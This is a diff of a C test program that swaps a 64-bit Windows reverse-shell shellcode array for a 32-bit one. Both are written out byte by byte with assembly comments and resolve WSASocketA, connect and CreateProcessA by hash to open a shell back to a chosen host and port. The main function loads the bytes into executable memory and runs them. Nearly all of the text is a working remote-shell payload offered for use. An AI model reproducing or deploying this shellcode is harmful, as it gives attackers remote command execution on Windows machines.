@@ -6,164 +6,128 @@
 #pragma comment (lib, "ws2_32.lib")
 #define in_addr_t unsigned long
 
-//
-// 350 bytes reverse shell for windows 64 using ipv4
-//
-// cl rev_overlap64_test.cpp
-//
-
 /* Copyright (c) 2014 Kevin Devine */
-/* Size = 350 bytes */
+/* Size = 226 bytes */
 
-char rev_overlap64[] = {
-  /* 0000 */  "\x53"                          /*  push rbx                                 */
-  /* 0001 */  "\x56"                          /*  push rsi                                 */
-  /* 0002 */  "\x57"                          /*  push rdi                                 */
-  /* 0003 */  "\x55"                          /*  push rbp                                 */
-  /* 0004 */  "\x41\x54"                      /*  push r12                                 */
-  /* 0006 */  "\x41\x55"                      /*  push r13                                 */
-  /* 0008 */  "\x41\x56"                      /*  push r14                                 */
-  /* 000A */  "\x41\x57"                      /*  push r15                                 */
-  /* 000C */  "\x4C\x8B\xFC"                  /*  mov r15, rsp                             */
-  /* 000F */  "\x48\x83\xE4\xF0"              /*  and rsp, FFFFFFFFFFFFFFF0h               */
-  /* 0013 */  "\x48\x83\xEC\x28"              /*  sub rsp, 28h                             */
-  /* 0017 */  "\xF9"                          /*  stc                                      */
-  /* 0018 */  "\xEB\x6E"                      /*  jmp 00000088h                            */
-  /* 001A */  "\x5E"                          /*  pop rsi                                  */
-  /* 001B */  "\x48\x8D\x6E\x24"              /*  lea rbp, qword ptr [rsi+24h]             */
-  /* 001F */  "\x33\xC0"                      /*  xor eax, eax                             */
-  /* 0021 */  "\x99"                          /*  cdq                                      */
-  /* 0022 */  "\xB2\xE8"                      /*  mov dl, E8h                              */
-  /* 0024 */  "\x2B\xE2"                      /*  sub esp, edx                             */
-  /* 0026 */  "\x8B\xCA"                      /*  mov ecx, edx                             */
-  /* 0028 */  "\x48\x8B\xFC"                  /*  mov rdi, rsp                             */
-  /* 002B */  "\xF3\xAA"                      /*  rep stosb                                */
-  /* 002D */  "\xB8\x9C\x92\x9B\xFF"          /*  mov eax, FF9B929Ch                       */
-  /* 0032 */  "\xF7\xD0"                      /*  not eax                                  */
-  /* 0034 */  "\x48\x8D\x7C\x24\x50"          /*  lea rdi, qword ptr [rsp+50h]             */
-  /* 0039 */  "\x4C\x8B\xE7"                  /*  mov r12, rdi                             */
-  /* 003C */  "\x48\xAB"                      /*  stosq                                    */
-  /* 003E */  "\x4C\x8B\xEF"                  /*  mov r13, rdi                             */
-  /* 0041 */  "\x48\xAD"                      /*  lodsq                                    */
-  /* 0043 */  "\x48\xF7\xD0"                  /*  not rax                                  */
-  /* 0046 */  "\x48\xAB"                      /*  stosq                                    */
-  /* 0048 */  "\x48\xAF"                      /*  scasq                                    */
-  /* 004A */  "\x4C\x8B\xF7"                  /*  mov r14, rdi                             */
-  /* 004D */  "\x6A\x68"                      /*  push 00000068h                           */
-  /* 004F */  "\x58"                          /*  pop rax                                  */
-  /* 0050 */  "\xAB"                          /*  stosd                                    */
-  /* 0051 */  "\x41\xFF\x46\x3D"              /*  inc dword ptr [r14+3Dh]                  */
-  /* 0055 */  "\x4C\x89\x74\x24\x40"          /*  mov qword ptr [rsp+40h], r14             */
-  /* 005A */  "\x49\x8D\x7E\x50"              /*  lea rdi, qword ptr [r14+50h]             */
-  /* 005E */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
-  /* 0061 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
-  /* 0064 */  "\xB2\x01"                      /*  mov dl, 01h                              */
-  /* 0066 */  "\xB1\x02"                      /*  mov cl, 02h                              */
-  /* 0068 */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 006A */  "\x48\xAB"                      /*  stosq                                    */
-  /* 006C */  "\x48\xAB"                      /*  stosq                                    */
-  /* 006E */  "\x48\xAB"                      /*  stosq                                    */
-  /* 0070 */  "\x48\xAF"                      /*  scasq                                    */
-  /* 0072 */  "\x93"                          /*  xchg eax, ebx                            */
-  /* 0073 */  "\x48\x89\x7C\x24\x48"          /*  mov qword ptr [rsp+48h], rdi             */
-  /* 0078 */  "\xFF\x44\x24\x20"              /*  inc dword ptr [rsp+20h]                  */
-  /* 007C */  "\x6A\x10"                      /*  push 00000010h                           */
-  /* 007E */  "\x41\x58"                      /*  pop r8                                   */
-  /* 0080 */  "\x49\x8B\xD5"                  /*  mov rdx, r13                             */
-  /* 0083 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
-  /* 0085 */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 0087 */  "\xF8"                          /*  clc                                      */
-  /* 0088 */  "\x72\x33"                      /*  jc 000000BDh                             */
-  /* 008A */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
-  /* 008D */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
-  /* 0090 */  "\x49\x8B\xD4"                  /*  mov rdx, r12                             */
-  /* 0093 */  "\x91"                          /*  xchg eax, ecx                            */
-  /* 0094 */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 0096 */  "\x83\xCA\xFF"                  /*  or edx, FFFFFFFFh                        */
-  /* 0099 */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
-  /* 009C */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 009E */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
-  /* 00A1 */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 00A3 */  "\x48\x8B\x4F\x08"              /*  mov rcx, qword ptr [rdi+08h]             */
-  /* 00A7 */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 00A9 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
-  /* 00AB */  "\xFF\xD5"                      /*  call rbp                                 */
-  /* 00AD */  "\x49\x8B\xE7"                  /*  mov rsp, r15                             */
-  /* 00B0 */  "\x41\x5F"                      /*  pop r15                                  */
-  /* 00B2 */  "\x41\x5E"                      /*  pop r14                                  */
-  /* 00B4 */  "\x41\x5D"                      /*  pop r13                                  */
-  /* 00B6 */  "\x41\x5C"                      /*  pop r12                                  */
-  /* 00B8 */  "\x5D"                          /*  pop rbp                                  */
-  /* 00B9 */  "\x5F"                          /*  pop rdi                                  */
-  /* 00BA */  "\x5E"                          /*  pop rsi                                  */
-  /* 00BB */  "\x5B"                          /*  pop rbx                                  */
-  /* 00BC */  "\xC3"                          /*  ret                                      */
-  /* 00BD */  "\xE8\x58\xFF\xFF\xFF"          /*  call 0000001Ah                           */
-
-  /* 00C2 */  "\x00\x00\x00\x00"              /*  sockaddr_in with sin_zero field missing */
-  /* 00C6 */  "\x00\x00\x00\x00"
-
-  /* 00CA */  "\xB2\xA5\xC1\x87"              /*  WSASocketA          */
-  /* 00CE */  "\xEC\x80\x9C\xE4"              /*  connect             */
-  /* 00D2 */  "\xFE\xDF\x72\x17"              /*  CreateProcessA      */
-  /* 00D6 */  "\x4B\xDA\x38\x53"              /*  WaitForSingleObject */
-  /* 00DA */  "\x35\xC9\x1E\x7F"              /*  CloseHandle         */
-  /* 00DE */  "\x35\xC9\x1E\x7F"              /*  CloseHandle         */
-  /* 00E2 */  "\x6E\xED\xCD\xA2"              /*  closesocket         */
+char rev_overlap32[] = {
+  /* 0000 */  "\x60"                              /*  pushad                                   */
+  /* 0001 */  "\xEB\x65"                          /*  jmp 00000068h                            */
+  /* 0003 */  "\x5E"                              /*  pop esi                                  */
+  /* 0004 */  "\x8D\x6E\x1C"                      /*  lea ebp, dword ptr [esi+1Ch]             */
+  /* 0007 */  "\x33\xC0"                          /*  xor eax, eax                             */
+  /* 0009 */  "\x99"                              /*  cdq                                      */
+  /* 000A */  "\xB2\x58"                          /*  mov dl, 58h                              */
+  /* 000C */  "\x2B\xE2"                          /*  sub esp, edx                             */
+  /* 000E */  "\x8B\xFC"                          /*  mov edi, esp                             */
+  /* 0010 */  "\x8B\xCA"                          /*  mov ecx, edx                             */
+  /* 0012 */  "\xF3\xAA"                          /*  rep stosb                                */
+  /* 0014 */  "\x6A\x01"                          /*  push 00000001h                           */
+  /* 0016 */  "\x6A\x02"                          /*  push 00000002h                           */
+  /* 0018 */  "\xFF\xD5"                          /*  call ebp                                 */
+  /* 001A */  "\x93"                              /*  xchg eax, ebx                            */
+  /* 001B */  "\x8B\xFC"                          /*  mov edi, esp                             */
+  /* 001D */  "\x6A\x10"                          /*  push 00000010h                           */
+  /* 001F */  "\x57"                              /*  push edi                                 */
+  /* 0020 */  "\x53"                              /*  push ebx                                 */
+  /* 0021 */  "\xAD"                              /*  lodsd                                    */
+  /* 0022 */  "\xF7\xD0"                          /*  not eax                                  */
+  /* 0024 */  "\xAB"                              /*  stosd                                    */
+  /* 0025 */  "\xAD"                              /*  lodsd                                    */
+  /* 0026 */  "\xF7\xD0"                          /*  not eax                                  */
+  /* 0028 */  "\xAB"                              /*  stosd                                    */
+  /* 0029 */  "\xFF\xD5"                          /*  call ebp                                 */
+  /* 002B */  "\x8B\xFC"                          /*  mov edi, esp                             */
+  /* 002D */  "\x6A\x44"                          /*  push 00000044h                           */
+  /* 002F */  "\x8F\x07"                          /*  pop dword ptr [edi]                      */
+  /* 0031 */  "\x89\x47\x04"                      /*  mov dword ptr [edi+04h], eax             */
+  /* 0034 */  "\xFF\x47\x2D"                      /*  inc dword ptr [edi+2Dh]                  */
+  /* 0037 */  "\x93"                              /*  xchg eax, ebx                            */
+  /* 0038 */  "\x8D\x7F\x38"                      /*  lea edi, dword ptr [edi+38h]             */
+  /* 003B */  "\xAB"                              /*  stosd                                    */
+  /* 003C */  "\xAB"                              /*  stosd                                    */
+  /* 003D */  "\xAB"                              /*  stosd                                    */
+  /* 003E */  "\x93"                              /*  xchg eax, ebx                            */
+  /* 003F */  "\xB8\x9C\x92\x9B\xFF"              /*  mov eax, FF9B929Ch                       */
+  /* 0044 */  "\xF7\xD0"                          /*  not eax                                  */
+  /* 0046 */  "\x99"                              /*  cdq                                      */
+  /* 0047 */  "\x8B\xCF"                          /*  mov ecx, edi                             */
+  /* 0049 */  "\xAB"                              /*  stosd                                    */
+  /* 004A */  "\x8B\xC4"                          /*  mov eax, esp                             */
+  /* 004C */  "\x50"                              /*  push eax                                 */
+  /* 004D */  "\x50"                              /*  push eax                                 */
+  /* 004E */  "\x52"                              /*  push edx                                 */
+  /* 004F */  "\x52"                              /*  push edx                                 */
+  /* 0050 */  "\x52"                              /*  push edx                                 */
+  /* 0051 */  "\x51"                              /*  push ecx                                 */
+  /* 0052 */  "\x52"                              /*  push edx                                 */
+  /* 0053 */  "\x52"                              /*  push edx                                 */
+  /* 0054 */  "\x51"                              /*  push ecx                                 */
+  /* 0055 */  "\x52"                              /*  push edx                                 */
+  /* 0056 */  "\xFF\xD5"                          /*  call ebp                                 */
+  /* 0058 */  "\x8B\x04\x24"                      /*  mov eax, dword ptr [esp]                 */
+  /* 005B */  "\x6A\xFF"                          /*  push FFFFFFFFh                           */
+  /* 005D */  "\x50"                              /*  push eax                                 */
+  /* 005E */  "\xFF\xD5"                          /*  call ebp                                 */
+  /* 0060 */  "\x53"                              /*  push ebx                                 */
+  /* 0061 */  "\xFF\xD5"                          /*  call ebp                                 */
+  /* 0063 */  "\x83\xC4\x48"                      /*  add esp, 48h                             */
+  /* 0066 */  "\x61"                              /*  popad                                    */
+  /* 0067 */  "\xC3"                              /*  ret                                      */
+  /* 0068 */  "\xE8\x96\xFF\xFF\xFF"              /*  call 00000003h                           */
   
-  /* 00E6 */  "\xAD"                          /*  lodsd                                    */
-  /* 00E7 */  "\x50"                          /*  push rax                                 */
-  /* 00E8 */  "\x51"                          /*  push rcx                                 */
-  /* 00E9 */  "\x52"                          /*  push rdx                                 */
-  /* 00EA */  "\x53"                          /*  push rbx                                 */
-  /* 00EB */  "\x55"                          /*  push rbp                                 */
-  /* 00EC */  "\x56"                          /*  push rsi                                 */
-  /* 00ED */  "\x57"                          /*  push rdi                                 */
-  /* 00EE */  "\x6A\x60"                      /*  push 00000060h                           */
-  /* 00F0 */  "\x5E"                          /*  pop rsi                                  */
-  /* 00F1 */  "\x65\x48\xAD"                  /*  lodsq                                    */
-  /* 00F4 */  "\x48\x8B\x40\x18"              /*  mov rax, qword ptr [rax+18h]             */
-  /* 00F8 */  "\x4C\x8B\x50\x30"              /*  mov r10, qword ptr [rax+30h]             */
-  /* 00FC */  "\x49\x8B\x6A\x10"              /*  mov rbp, qword ptr [r10+10h]             */
-  /* 0100 */  "\x4D\x8B\x12"                  /*  mov r10, qword ptr [r10]                 */
-  /* 0103 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]             */
-  /* 0106 */  "\x83\xC0\x10"                  /*  add eax, 10h                             */
-  /* 0109 */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [rax+rbp+78h]         */
-  /* 010D */  "\x48\x8D\x74\x28\x18"          /*  lea rsi, qword ptr [rax+rbp+18h]         */
-  /* 0112 */  "\xAD"                          /*  lodsd                                    */
-  /* 0113 */  "\x91"                          /*  xchg eax, ecx                            */
-  /* 0114 */  "\x67\xE3\xE5"                  /*  jecxz 000000FCh                          */
-  /* 0117 */  "\xAD"                          /*  lodsd                                    */
-  /* 0118 */  "\x4C\x8D\x1C\x28"              /*  lea r11, qword ptr [rax+rbp]             */
-  /* 011C */  "\xAD"                          /*  lodsd                                    */
-  /* 011D */  "\x48\x8D\x3C\x28"              /*  lea rdi, qword ptr [rax+rbp]             */
-  /* 0121 */  "\xAD"                          /*  lodsd                                    */
-  /* 0122 */  "\x48\x8D\x1C\x28"              /*  lea rbx, qword ptr [rax+rbp]             */
-  /* 0126 */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [rdi+rcx*4-04h]       */
-  /* 012A */  "\x48\x03\xF5"                  /*  add rsi, rbp                             */
-  /* 012D */  "\x33\xC0"                      /*  xor eax, eax                             */
-  /* 012F */  "\x99"                          /*  cdq                                      */
-  /* 0130 */  "\xAC"                          /*  lodsb                                    */
-  /* 0131 */  "\x03\xD0"                      /*  add edx, eax                             */
-  /* 0133 */  "\xC1\xC2\x07"                  /*  rol edx, 07h                             */
-  /* 0136 */  "\x33\xD0"                      /*  xor edx, eax                             */
-  /* 0138 */  "\xFF\xC8"                      /*  dec eax                                  */
-  /* 013A */  "\x79\xF4"                      /*  jns 00000130h                            */
-  /* 013C */  "\x48\x3B\x54\x24\x30"          /*  cmp rdx, qword ptr [rsp+30h]             */
-  /* 0141 */  "\xE0\xE3"                      /*  loopne 00000126h                         */
-  /* 0143 */  "\x75\xB7"                      /*  jne 000000FCh                            */
-  /* 0145 */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [rbx+rcx*2]          */
-  /* 0149 */  "\x41\x8B\x04\x93"              /*  mov eax, dword ptr [r11+rdx*4]           */
-  /* 014D */  "\x48\x03\xE8"                  /*  add rbp, rax                             */
-  /* 0150 */  "\x48\x89\x6C\x24\x30"          /*  mov qword ptr [rsp+30h], rbp             */
-  /* 0155 */  "\x5F"                          /*  pop rdi                                  */
-  /* 0156 */  "\x5E"                          /*  pop rsi                                  */
-  /* 0157 */  "\x5D"                          /*  pop rbp                                  */
-  /* 0158 */  "\x5B"                          /*  pop rbx                                  */
-  /* 0159 */  "\x5A"                          /*  pop rdx                                  */
-  /* 015A */  "\x59"                          /*  pop rcx                                  */
-  /* 015B */  "\x58"                          /*  pop rax                                  */
-  /* 015C */  "\xFF\xE0"                      /*  jmp rax                                  */
+  /* 006D */  "\xB2\xA5\xC1\x87"                  /*  WSASocketA                               */
+  
+  /* 0071 */  "\x00\x00\x00\x00"                  /*  sockaddr_in without sin_zero field       */
+  /* 0075 */  "\x00\x00\x00\x00"
+  
+  /* 0079 */  "\xEC\x80\x9C\xE4"                  /*  connect                                  */
+  /* 007D */  "\xFE\xDF\x72\x17"                  /*  CreateProcessA                           */
+  /* 0081 */  "\x4B\xDA\x38\x53"                  /*  WaitForSingleObject                      */
+  /* 0085 */  "\x6E\xED\xCD\xA2"                  /*  closesocket                              */
+  
+  /* 0089 */  "\xAD"                              /*  lodsd                                    */
+  /* 008A */  "\x60"                              /*  pushad                                   */
+  /* 008B */  "\x6A\x30"                          /*  push 00000030h                           */
+  /* 008D */  "\x5E"                              /*  pop esi                                  */
+  /* 008E */  "\x64\xAD"                          /*  lodsd                                    */
+  /* 0090 */  "\x8B\x40\x0C"                      /*  mov eax, dword ptr [eax+0Ch]             */
+  /* 0093 */  "\x8B\x70\x1C"                      /*  mov esi, dword ptr [eax+1Ch]             */
+  /* 0096 */  "\x8B\x6E\x08"                      /*  mov ebp, dword ptr [esi+08h]             */
+  /* 0099 */  "\xAD"                              /*  lodsd                                    */
+  /* 009A */  "\x50"                              /*  push eax                                 */
+  /* 009B */  "\x8B\x45\x3C"                      /*  mov eax, dword ptr [ebp+3Ch]             */
+  /* 009E */  "\x8B\x44\x28\x78"                  /*  mov eax, dword ptr [eax+ebp+78h]         */
+  /* 00A2 */  "\x8D\x74\x28\x18"                  /*  lea esi, dword ptr [eax+ebp+18h]         */
+  /* 00A6 */  "\xAD"                              /*  lodsd                                    */
+  /* 00A7 */  "\x91"                              /*  xchg eax, ecx                            */
+  /* 00A8 */  "\xE3\xEC"                          /*  jecxz 00000096h                          */
+  /* 00AA */  "\xAD"                              /*  lodsd                                    */
+  /* 00AB */  "\x03\xC5"                          /*  add eax, ebp                             */
+  /* 00AD */  "\x50"                              /*  push eax                                 */
+  /* 00AE */  "\xAD"                              /*  lodsd                                    */
+  /* 00AF */  "\x8D\x3C\x28"                      /*  lea edi, dword ptr [eax+ebp]             */
+  /* 00B2 */  "\xAD"                              /*  lodsd                                    */
+  /* 00B3 */  "\x8D\x1C\x28"                      /*  lea ebx, dword ptr [eax+ebp]             */
+  /* 00B6 */  "\x8B\x74\x8F\xFC"                  /*  mov esi, dword ptr [edi+ecx*4-04h]       */
+  /* 00BA */  "\x03\xF5"                          /*  add esi, ebp                             */
+  /* 00BC */  "\x33\xC0"                          /*  xor eax, eax                             */
+  /* 00BE */  "\x99"                              /*  cdq                                      */
+  /* 00BF */  "\xAC"                              /*  lodsb                                    */
+  /* 00C0 */  "\x03\xD0"                          /*  add edx, eax                             */
+  /* 00C2 */  "\xC1\xC2\x07"                      /*  rol edx, 07h                             */
+  /* 00C5 */  "\x33\xD0"                          /*  xor edx, eax                             */
+  /* 00C7 */  "\x48"                              /*  dec eax                                  */
+  /* 00C8 */  "\x79\xF5"                          /*  jns 000000BFh                            */
+  /* 00CA */  "\x3B\x54\x24\x24"                  /*  cmp edx, dword ptr [esp+24h]             */
+  /* 00CE */  "\xE0\xE6"                          /*  loopne 000000B6h                         */
+  /* 00D0 */  "\x58"                              /*  pop eax                                  */
+  /* 00D1 */  "\x5E"                              /*  pop esi                                  */
+  /* 00D2 */  "\x75\xC2"                          /*  jne 00000096h                            */
+  /* 00D4 */  "\x0F\xB7\x14\x4B"                  /*  movzx edx, word ptr [ebx+ecx*2]          */
+  /* 00D8 */  "\x03\x2C\x90"                      /*  add ebp, dword ptr [eax+edx*4]           */
+  /* 00DB */  "\x89\x6C\x24\x1C"                  /*  mov dword ptr [esp+1Ch], ebp             */
+  /* 00DF */  "\x61"                              /*  popad                                    */
+  /* 00E0 */  "\xFF\xE0"                          /*  jmp eax                                  */
 };
 
 /**********************************************************************
@@ -189,8 +153,8 @@ int main (int argc, char* argv[]) {
   puts ("\nCopyright (c) 2014 Kevin Devine\n");
   
   if (argc != 3) {
-    printf ("\nUsage: rev_overlap64_test <host> <port>");
-    printf ("\nExample: rev_overlap64_test localhost 80\n");
+    printf ("\nUsage: rev_overlap32_test <host> <port>");
+    printf ("\nExample: rev_overlap32_test localhost 80\n");
     return 0;
   }
   
@@ -198,16 +162,16 @@ int main (int argc, char* argv[]) {
   WSADATA wsa;
   WSAStartup (MAKEWORD(2, 0), &wsa);
   
-  sockaddr_in *p = (sockaddr_in*)&rev_overlap64[0xc2];
+  sockaddr_in *p = (sockaddr_in*)&rev_overlap32[0x71];
   in_addr_t ip = ~resolve (argv[1]);
   
   memcpy (&p->sin_addr, &ip, sizeof (ip));
   p->sin_port   = ~htons (atoi(argv[2]));
   p->sin_family = ~AF_INET;
   
-  void *exec = VirtualAlloc(0, strlen (rev_overlap64), 
+  void *exec = VirtualAlloc(0, strlen (rev_overlap32), 
       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  memcpy (exec, rev_overlap64, strlen (rev_overlap64));
+  memcpy (exec, rev_overlap32, strlen (rev_overlap32));
   //DebugBreak();
   ((void(*)())exec)();
   VirtualFree (exec, 0, MEM_RELEASE);
